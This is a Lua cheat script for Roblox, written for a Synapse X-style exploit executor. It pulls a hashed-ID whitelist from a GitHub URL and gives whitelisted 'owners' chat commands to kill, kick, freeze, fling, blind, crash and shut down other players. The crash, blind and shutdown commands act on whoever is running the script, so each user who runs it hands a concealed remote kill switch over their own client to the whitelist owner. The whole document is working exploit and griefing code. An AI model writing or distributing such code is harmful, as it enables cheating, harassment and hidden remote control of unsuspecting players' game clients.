-- Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")
local CoreGui = game:GetService("CoreGui")

-- SHA-512 hashing function (Synapse/X or similar exploit environment)
local function sha512(str)
    if syn and syn.sha512 then
        return syn.sha512(str)
    else
        error("SHA-512 not supported in this environment")
    end
end

-- GitHub whitelist URL (raw file)
local WHITELIST_URL = "https://raw.githubusercontent.com/YourUsername/YourRepo/main/whitelist.json"

-- Fetch whitelist
local function fetchWhitelist()
    local success, result = pcall(function()
        return HttpService:GetAsync(WHITELIST_URL)
    end)
    if success then
        return HttpService:JSONDecode(result)
    else
        warn("Failed to fetch whitelist: "..tostring(result))
        return {}
    end
end

local whitelist = fetchWhitelist()

-- Tags/colors
local tags = {}
local colors = {
    ["GALAXY OWNER"] = "#800080"
}

local function tagPlayer(player, tagName)
    tags[player.Name] = {txt = tagName, col = colors[tagName] or "#FFFFFF"}
end

-- Chat prefix
TextChatService.OnIncomingMessage = function(msg)
    local p = Instance.new("TextChatMessageProperties")
    if msg.TextSource then
        local plr = Players:GetPlayerByUserId(msg.TextSource.UserId)
        if plr and tags[plr.Name] then
            local d = tags[plr.Name]
            p.PrefixText = "<font color='"..d.col.."'>["..d.txt.."]</font> "..msg.PrefixText
        end
    end
    return p
end

-- Helper: get player by name
local function getPlayerByName(name)
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower():find(name:lower()) then
            return p
        end
    end
    return nil
end

-- Commands
local commands = {
    kill = function(target) if target.Character then target.Character:BreakJoints() end end,
    kick = function(target, _, args) if target then target:Kick(table.concat(args," ") or "Kicked") end end,
    freeze = function(target)
        if target.Character then
            for _, part in ipairs(target.Character:GetChildren()) do
                if part:IsA("BasePart") then part.Anchored = true end
            end
        end
    end,
    thaw = function(target)
        if target.Character then
            for _, part in ipairs(target.Character:GetChildren()) do
                if part:IsA("BasePart") then part.Anchored = false end
            end
        end
    end,
    bring = function(target, admin)
        local hrpT = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
        local hrpA = admin.Character and admin.Character:FindFirstChild("HumanoidRootPart")
        if hrpT and hrpA then hrpT.CFrame = hrpA.CFrame + Vector3.new(2,0,0) end
    end,
    goto = function(target, admin)
        local hrpT = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
        local hrpA = admin.Character and admin.Character:FindFirstChild("HumanoidRootPart")
        if hrpT and hrpA then hrpA.CFrame = hrpT.CFrame + Vector3.new(2,0,0) end
    end,
    speed = function(target, _, args)
        local hum = target.Character and target.Character:FindFirstChildOfClass("Humanoid")
        if hum and tonumber(args[1]) then hum.WalkSpeed = tonumber(args[1]) end
    end,
    jump = function(target, _, args)
        local hum = target.Character and target.Character:FindFirstChildOfClass("Humanoid")
        if hum and tonumber(args[1]) then hum.JumpPower = tonumber(args[1]) end
    end,
    fling = function(target)
        local hrp = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
        if hrp then hrp.Velocity = Vector3.new(math.random(-200,200),500,math.random(-200,200)) end
    end,
    trip = function(target)
        local hum = target.Character and target.Character:FindFirstChildOfClass("Humanoid")
        local hrp = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
        if hum and hrp then
            hrp.Velocity = hrp.CFrame.LookVector*15
            hum:ChangeState(Enum.HumanoidStateType.FallingDown)
        end
    end,
    blind = function(target)
        if target == Players.LocalPlayer then
            local gui = Instance.new("ScreenGui", CoreGui)
            gui.Name = "BlindGUI"
            gui.IgnoreGuiInset = true
            local frame = Instance.new("Frame", gui)
            frame.Size = UDim2.fromScale(1,1)
            frame.BackgroundColor3 = Color3.new(0,0,0)
            frame.BackgroundTransparency = 0
        end
    end,
    crash = function(target)
        if target == Players.LocalPlayer then
            task.spawn(function()
                repeat
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(1e10,1e10,1e10)
                    part.Parent = workspace
                until false
            end)
        end
    end,
    shutdown = function(target)
        if target == Players.LocalPlayer then
            game:Shutdown()
        end
    end,
    help = function(_, _, _)
        local cmdList = {}
        for k,_ in pairs(commands) do table.insert(cmdList,"!"..k) end
        local msg = "Available commands: "..table.concat(cmdList,", ")
        print(msg)
        local textChannel = TextChatService:GetTextChannels()[1]
        if textChannel then textChannel:SendAsync(msg) end
    end
}

-- Add admin
local function addAdmin(player, data)
    tagPlayer(player, data.tag)
    player.Chatted:Connect(function(msg)
        local split = msg:split(" ")
        local cmdName = split[1]:lower():gsub("!","")
        table.remove(split,1)
        local targetName = split[1]
        local args = {}
        if targetName then
            table.remove(split,1)
            args = split
        end
        local targetPlayer = targetName and getPlayerByName(targetName) or Players.LocalPlayer
        if commands[cmdName] then
            commands[cmdName](targetPlayer, player, args)
        end
    end)
end

-- Check whitelist for existing players
for _, player in ipairs(Players:GetPlayers()) do
    local hashed = sha512(tostring(player.UserId))
    for _, data in pairs(whitelist) do
        if data.userid == hashed then
            addAdmin(player, data)
        end
    end
end

-- Check whitelist for new players
Players.PlayerAdded:Connect(function(player)
    local hashed = sha512(tostring(player.UserId))
    for _, data in pairs(whitelist) do
        if data.userid == hashed then
            addAdmin(player, data)
        end
    end
end)
